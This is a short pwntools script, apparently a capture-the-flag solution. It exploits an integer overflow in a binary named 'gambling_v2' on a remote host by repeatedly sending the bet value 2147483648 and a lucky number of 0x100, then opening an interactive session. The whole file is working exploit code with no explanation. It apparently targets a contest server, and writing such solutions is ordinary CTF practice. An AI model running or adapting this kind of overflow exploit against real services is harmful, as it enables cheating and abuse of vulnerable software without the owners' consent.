from pwn import *
context.clear(log_level='debug', os='linux', kernel='amd64')
p = remote("141.164.39.45", 1357)
# p = process("./gambling_v2")
e = ELF("./gambling_v2")

intoverflow = 2147483648

for i in range(10001 // 684):
    p.sendlineafter(b"bat money : ", str(intoverflow))
    p.sendlineafter(b'choose lucky number :', str(0x100))


p.interactive()